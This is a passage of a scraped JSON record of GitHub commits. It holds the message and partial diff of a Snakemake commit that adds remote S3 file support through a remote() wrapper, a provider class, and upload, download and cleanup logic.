`provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https://boto.readthedocs.org/en/latest/ref/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name/out.txt\")\n        output:\n            \"bucket-name/out.txt\"\n        run:\n            shell(\"cp {output[0]} ./\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote/`. This is similar in nature to the function `test_cluster_dynamic/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic."}}, "https://github.com/tianyabeef/gutMicrobiome": {"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d": {"url": "https://api.github.com/repos/tianyabeef/gutMicrobiome/commits/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "html_url": "https://github.com/tianyabeef/gutMicrobiome/commit/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "message": "Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https://boto.readthedocs.org/en/latest/ref/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name/out.txt\")\n        output:\n            \"bucket-name/out.txt\"\n        run:\n            shell(\"cp {output[0]} ./\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote/`. This is similar in nature to the function `test_cluster_dynamic/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic.", "sha": "7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "keyword": "remote code execution protect", "diff": "diff --git a/setup.py b/setup.py\nindex dfea1dd..97f4d86 100644\n--- a/setup.py\n+++ b/setup.py\n@@ -59,6 +59,7 @@ def run_tests(self):\n     },\n     package_data={'': ['*.css', '*.sh', '*.html']},\n     tests_require=['nose>=1.3'],\n+    install_requires=['boto>=2.38.0','filechunkio>=1.6', 'moto>=0.4.14'],\n     cmdclass={'test': NoseTestCommand},\n     classifiers=\n     [\"Development Status :: 5 - Production/Stable\", \"Environment :: Console\",\ndiff --git a/snakemake/dag.py b/snakemake/dag.py\nindex f1ead14..e591550 100644\n--- a/snakemake/dag.py\n+++ b/snakemake/dag.py\n@@ -10,7 +10,7 @@\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n@@ -288,6 +288,51 @@ def unneeded_files():\n             logger.info(\"Removing temporary output file {}.\".format(f))\n             f.remove()\n \n+    def handle_remote(self, job):\n+        \"\"\" Remove local files if they are no longer needed, and upload to S3. \"\"\"\n+        \n+        needed = lambda job_, f: any(\n+            f in files for j, files in self.depending[job_].items()\n+            if not self.finished(j) and self.needrun(j) and j != job)\n+\n+        remote_files = set([f for f in job.expanded_input if f.is_remote]) | set([f for f in job.expanded_output if f.is_remote])\n+        local_files = set([f for f in job.input if not f.is_remote]) | set([f for f in job.expanded_output if not f.is_remote])\n+        files_to_keep = set(f for f in remote_files if is_flagged(f, \"keep\"))\n+\n+        # remove local files from list of remote files\n+        # in case the same file is specified in both places\n+        remote_files -= local_files\n+        remote_files -= files_to_keep\n+\n+        def unneeded_files():\n+            for job_, files in self.dependencies[job].items():\n+                for f in (remote_files & files):\n+                    if not needed(job_, f) and not f.protected:\n+                        yield f\n+            for f in filterfalse(partial(needed, job), [f for f in remote_files]):\n+                if not f in self.targetfiles and not f.protected:\n+                    yield f\n+\n+        def expanded_dynamic_depending_input_files():\n+            for j in self.depending[job]:    \n+                for f in j.expanded_input:\n+                    yield f\n+\n+        unneededFiles = set(unneeded_files())\n+        unneededFiles -= set(expanded_dynamic_depending_input_files())\n+\n+        for f in [f for f in job.expanded_output if f.is_remote]:\n+            if not f.exists_remote:\n+                logger.info(\"Uploading local output file to remote: {}\".format(f))\n+                f.upload_to_remote()\n+\n+        for f in set(unneededFiles):\n+            logger.info(\"Removing local output file: {}\".format(f))\n+            f.remove()\n+\n+        job.rmdir_empty_remote_dirs()\n+\n+\n     def jobid(self, job):\n         if job not in self._jobid:\n             self._jobid[job] = len(self._jobid)\ndiff --git a/snakemake/decorators.py b/snakemake/decorators.py\nnew file mode 100644\nindex 0000000..063ddde\n--- /dev/null\n+++ b/snakemake/decorators.py\n@@ -0,0 +1,31 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import functools\n+import inspect\n+\n+\n+def memoize(obj):\n+    cache = obj.cache = {}\n+\n+    @functools.wraps(obj)\n+    def memoizer(*args, **kwargs):\n+        key = str(args) + str(kwargs)\n+        if key not in cache:\n+            cache[key] = obj(*args, **kwargs)\n+        return cache[key]\n+\n+    return memoizer\n+\n+\n+def decAllMethods(decorator, prefix='test_'):\n+\n+    def decClass(cls):\n+        for name, m in inspect.getmembers(cls, inspect.isfunction):\n+            if prefix == None or name.startswith(prefix):\n+                setattr(cls, name, decorator(m))\n+        return cls\n+\n+    return decClass\ndiff --git a/snakemake/exceptions.py b/snakemake/exceptions.py\nindex d606c99..7440442 100644\n--- a/snakemake/exceptions.py\n+++ b/snakemake/exceptions.py\n@@ -281,6 +281,13 @@ class IOFileException(RuleException):\n     def __init__(self, msg, lineno=None, snakefile=None):\n         super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n+class RemoteFileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n+\n+class S3FileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n class ClusterJobException(RuleException):\n     def __init__(self, job, jobid, jobscript):\ndiff --git a/snakemake/executors.py b/snakemake/executors.py\nindex 6bd0114..961e7ba 100644\n--- a/snakemake/executors.py\n+++ b/snakemake/executors.py\n@@ -109,6 +109,7 @@ def print_job_error(self, job):\n     def finish_job(self, job):\n         self.dag.handle_touch(job)\n         self.dag.check_output(job, wait=self.latency_wait)\n+        self.dag.handle_remote(job)\n         self.dag.handle_protected(job)\n         self.dag.handle_temp(job)\n \ndiff --git a/snakemake/io.py b/snakemake/io.py\nindex 0ba9cbd..3e32628 100644\n--- a/snakemake/io.py\n+++ b/snakemake/io.py\n@@ -8,11 +8,12 @@\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n@@ -45,9 +46,46 @@ def __new__(cls, file):\n         obj._file = file\n         obj.rule = None\n         obj._regex = None\n+\n         return obj\n \n+    def __init__(self, file):\n+        self._remote_object = None\n+        if self.is_remote:\n+            additional_args = get_flag_value(self._file, \"additional_remote_args\") if get_flag_value(self._file, \"additional_remote_args\") else []\n+            additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+            self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, *additional_args, **additional_kwargs)\n+        pass\n+\n+    def _referToRemote(func):\n+        \"\"\" \n+            A decorator so that if the file is remote and has a version \n+            of the same file-related function, call that version instead. \n+        \"\"\"\n+        @functools.wraps(func)\n+        def wrapper(self, *args, **kwargs):\n+            if self.is_remote:\n+                if self.remote_object:\n+                    if hasattr( self.remote_object, func.__name__):\n+                        return getattr( self.remote_object, func.__name__)(*args, **kwargs)\n+            return func(self, *args, **kwargs)\n+        return wrapper\n+\n     @property\n+    def is_remote(self):\n+        return is_flagged(self._file, \"remote\")\n+    \n+    @property\n+    def remote_object(self):\n+        if not self._remote_object:\n+            if self.is_remote:\n+               additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+               self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, **additional_kwargs)\n+        return self._remote_object\n+    \n+\n+    @property\n+    @_referToRemote\n     def file(self):\n         if not self._is_function:\n             return self._file\n@@ -56,32 +94,74 @@ def file(self):\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n@@ -108,9 +188,10 @@ def protect(self):\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n@@ -136,11 +217,21 @@ def apply_wildcards(self, wildcards,\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n@@ -166,6 +257,17 @@ def match(self, target):\n     def format_dynamic(self):\n         return self.replace(self.dynamic_fill, \"{*}\")\n \n+    def clone_flags(self, other):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        if isinstance(other._file, AnnotatedString):\n+            self._file.flags = getattr(other._file, \"flags\", {})\n+\n+    def set_flags(self, flags):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        self._file.flags = flags\n+\n     def __eq__(self, other):\n         f = other._file if isinstance(other, _IOFile) else other\n         return self._file == f\n@@ -286,9 +388,17 @@ def flag(value, flag_type, flag_value=True):\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n@@ -297,6 +407,9 @@ def temp(value):\n     if is_flagged(value, \"protected\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n     return flag(value, \"temp\")\n \n \n@@ -310,6 +423,9 @@ def protected(value):\n     if is_flagged(value, \"temp\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n     return flag(value, \"protected\")\n \n \n@@ -318,7 +434,7 @@ def dynamic(value):\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n@@ -334,6 +450,36 @@ def dynamic(value):\n def touch(value):\n     return flag(value, \"touch\")\n \n+def remote(value, provider=S3, keep=False, additional_args=None, additional_kwargs=None):\n+\n+    additional_args = [] if not additional_args else additional_args\n+    additional_kwargs = {} if not additional_kwargs else additional_kwargs\n+\n+    if not provider:\n+        raise RemoteFileException(\"Provider (S3, etc.) must be specified for remote file as kwarg.\")\n+    if is_flagged(value, \"temp\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"protected\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n+    return flag(\n+                flag(\n+                    flag( \n+                        flag( \n+                            flag(value, \"remote\"), \n+                            \"remote_provider\", \n+                            provider\n+                        ), \n+                        \"additional_remote_kwargs\", \n+                        additional_kwargs\n+                    ),\n+                    \"additional_remote_args\",\n+                    additional_args\n+                ),\n+                \"keep\",\n+                keep\n+            )\n \n def expand(*args, **wildcards):\n     \"\"\"\n@@ -410,6 +556,31 @@ def glob_wildcards(pattern):\n                     getattr(wildcards, name).append(value)\n     return wildcards\n \n+def glob_wildcards_remote(pattern, provider=S3, additional_kwargs=None):\n+    additional_kwargs = additional_kwargs if additional_kwargs else {}\n+    referenceObj = IOFile(remote(pattern, provider=provider, **additional_kwargs))\n+    key_list = [k.name for k in referenceObj._remote_object.list] \n+\n+    pattern = \"./\"+ referenceObj._remote_object.name\n+    pattern = os.path.normpath(pattern)\n+    first_wildcard = re.search(\"{[^{]\", pattern)\n+    dirname = os.path.dirname(pattern[:first_wildcard.start(\n+    )]) if first_wildcard else os.path.dirname(pattern)\n+    if not dirname:\n+        dirname = \".\"\n+\n+    names = [match.group('name')\n+             for match in _wildcard_regex.finditer(pattern)]\n+    Wildcards = namedtuple(\"Wildcards\", names)\n+    wildcards = Wildcards(*[list() for name in names])\n+\n+    pattern = re.compile(regex(pattern))\n+    for f in key_list:\n+        match = re.match(pattern, f)\n+        if match:\n+            for name, value in match.groupdict().items():\n+                getattr(wildcards, name).append(value)\n+    return wildcards\n \n # TODO rewrite Namedlist!\n class Namedlist(list):\ndiff --git a/snakemake/jobs.py b/snakemake/jobs.py\nindex fdba8b5..317c7c4 100644\n--- a/snakemake/jobs.py\n+++ b/snakemake/jobs.py\n@@ -13,7 +13,7 @@\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n@@ -131,7 +131,40 @@ def expanded_output(self):\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n@@ -159,6 +192,34 @@ def missing_input(self):\n         return set(f for f in self.input\n                    if not f.exists and not f in self.subworkflow_input)\n \n+\n+    @property\n+    def present_remote_input(self):\n+        files = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if f.exists_remote:\n+                    files.add(f)\n+        return files\n+    \n+    @property\n+    def present_remote_output(self):\n+        files = set()\n+\n+        for f in self.remote_output:\n+            if f.exists_remote:\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def missing_remote_input(self):\n+        return self.remote_input - self.present_remote_input\n+\n+    @property\n+    def missing_remote_output(self):\n+        return self.remote_output - self.present_remote_output\n+\n     @property\n     def output_mintime(self):\n         \"\"\" Return oldest output file. \"\"\"\n@@ -197,6 +258,74 @@ def missing_output(self, requested=None):\n                     files.add(f)\n         return files\n \n+\n+    @property\n+    def remote_input(self):\n+        for f in self.input:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_output(self):\n+        for f in self.output:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_input_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_input_older_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_older_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    def transfer_updated_files(self):\n+        for f in self.remote_output_older_than_local | self.remote_input_older_than_local:\n+            f.upload_to_remote()\n+\n+        for f in self.remote_output_newer_than_local | self.remote_input_newer_than_local:\n+            f.download_from_remote()\n+    \n+    @property\n+    def files_to_download(self):\n+        toDownload = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if not f.exists_local and f.exists_remote:\n+                    toDownload.add(f)\n+\n+        toDownload = toDownload | self.remote_input_newer_than_local\n+        return toDownload\n+\n+    @property\n+    def files_to_upload(self):\n+        return self.missing_remote_input & self.remote_input_older_than_local\n+\n     @property\n     def existing_output(self):\n         return filter(lambda f: f.exists, self.expanded_output)\n@@ -231,6 +360,10 @@ def prepare(self):\n                 os.remove(f)\n         for f, f_ in zip(self.output, self.rule.output):\n             f.prepare()\n+\n+        for f in self.files_to_download:\n+            f.download_from_remote()\n+\n         for f in self.log:\n             f.prepare()\n         if self.benchmark:\n@@ -239,6 +372,8 @@ def prepare(self):\n     def cleanup(self):\n         \"\"\" Cleanup output files. \"\"\"\n         to_remove = [f for f in self.expanded_output if f.exists]\n+\n+        to_remove.extend([f for f in self.remote_input if f.exists])\n         if to_remove:\n             logger.info(\"Removing output files of failed job {}\"\n                         \" since they might be corrupted:\\n{}\".format(\n@@ -246,6 +381,23 @@ def cleanup(self):\n             for f in to_remove:\n                 f.remove()\n \n+            self.rmdir_empty_remote_dirs()\n+\n+    @property\n+    def empty_remote_dirs(self):\n+        remote_files = [f for f in (set(self.output) | set(self.input)) if f.is_remote]\n+        emptyDirsToRemove = set(os.path.dirname(f) for f in remote_files if not len(os.listdir(os.path.dirname(f))))\n+        return emptyDirsToRemove\n+\n+    def rmdir_empty_remote_dirs(self):\n+        for d in self.empty_remote_dirs:\n+            pathToDel = d\n+            while len(pathToDel) > 0 and len(os.listdir(pathToDel)) == 0:\n+                logger.info(\"rmdir empty dir: {}\".format(pathToDel))\n+                os.rmdir(pathToDel)\n+                pathToDel = os.path.dirname(pathToDel)\n+\n+\n     def format_wildcards(self, string, **variables):\n         \"\"\" Format a string with variables from the job. \"\"\"\n         _variables = dict()\ndiff --git a/snakemake/remote_providers/RemoteObjectProvider.py 